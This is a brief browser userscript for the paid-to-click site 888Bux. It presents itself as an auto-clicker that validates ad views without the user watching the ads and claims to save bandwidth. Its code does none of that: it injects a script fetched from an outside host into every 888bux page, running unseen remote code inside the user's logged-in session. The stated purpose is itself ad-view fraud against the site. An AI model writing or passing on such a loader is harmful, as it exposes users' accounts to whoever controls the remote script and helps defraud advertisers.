// ==UserScript==
// @name           JustOneClick for 888Bux
// @namespace      http://www.youtube.com/user/bath4rakala
// @description    An Auto-click for 888Bux, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css , js, swfs files etc WILL NOT loaded, and you will save your bandwidth.
// @include        *://*888bux.com/*
// @copyright      PTCSPY
// ==/UserScript==
var script = document.createElement('script');
script.language = 'javascript';
script.src = "http://angramainyu.isgreat.org/js/888Bux.js";
document.body.appendChild(script);